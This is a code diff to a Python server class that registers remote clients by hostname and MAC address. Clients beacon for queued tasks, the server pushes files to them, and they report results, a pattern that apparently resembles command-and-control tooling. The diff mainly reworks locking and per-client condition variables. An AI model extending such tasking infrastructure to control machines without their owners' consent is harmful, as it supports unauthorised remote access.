@@ -8,7 +8,6 @@ class Server:
         self.clients = {}
         self.task_meta = {}
         self.lock = Lock()
-        self.condition = Condition(self.lock)
  
     def identify(self, hostname, mac):
         client_id = str(uuid.uuid4())
@@ -17,24 +16,25 @@ class Server:
             self.clients[client_id] = {
                 "hostname": hostname,
                 "mac": mac,
-                "tasks": deque  (),
-                "results": {}
+                "tasks": deque(),
+                "results": {},
+                "condition": Condition(self.lock)
             }
 
         print(f"[+] connected {hostname} ({client_id})")
-
         return {"status": "ok", "client_id": client_id}
 
     def beacon(self, client_id, timeout=60):
-        with self.condition:
+        with self.lock:
             client = self.get_client(client_id)
+            cond = client["condition"]
 
-            if not client["tasks"]:
-                self.condition.wait(timeout)
+            while not client["tasks"]:
+                cond.wait(timeout)
+                break
 
             task = client["tasks"].popleft() if client["tasks"] else None
-
-        return {"task": task}
+            return {"task": task}
     
     def upload_file(self, client_id, local_path, remote_path):
         with open(local_path, "rb") as f:
@@ -52,18 +52,15 @@ class Server:
         )
 
     def enqueue(self, client_id, task):
-        with self.condition:
+        with self.lock:
             client = self.get_client(client_id)
             client["tasks"].append(task)
-
-            self.condition.notify_all()
+            client["condition"].notify()
 
     def get_client(self, client_id):
         client = self.clients.get(client_id)
-
         if not client:
             raise Exception("unknown client")
-
         return client
  
     def create_task(self, method, params=None):
@@ -78,19 +75,16 @@ class Server:
         task = self.create_task(method, params)
         if meta:
             self.task_meta[task["id"]] = meta
-        try:
-            self.enqueue(client_id, task)
-        except Exception:
-            print("unknown client")
+        self.enqueue(client_id, task)
     
     def task_result(self, client_id, task_id, result):
         with self.lock:
             client = self.get_client(client_id)
             client["results"][task_id] = result
+            host = client["hostname"]
         
         out = result["output"]
         status = result["status"]
-        host = self.clients[client_id]["hostname"]
         meta = self.task_meta.pop(task_id, None)
 
         print(f"[{host}] {status}")
